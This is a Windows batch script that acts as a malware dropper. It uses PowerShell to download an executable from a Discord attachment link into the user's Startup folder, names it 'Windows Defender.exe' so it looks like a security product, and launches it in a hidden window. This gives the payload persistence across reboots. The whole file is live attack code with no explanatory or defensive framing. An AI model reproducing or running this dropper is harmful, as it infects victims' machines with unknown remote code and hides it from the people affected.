@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://cdn.discordapp.com/attachments/1130988233761771581/1139195104532377620/i.exe"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
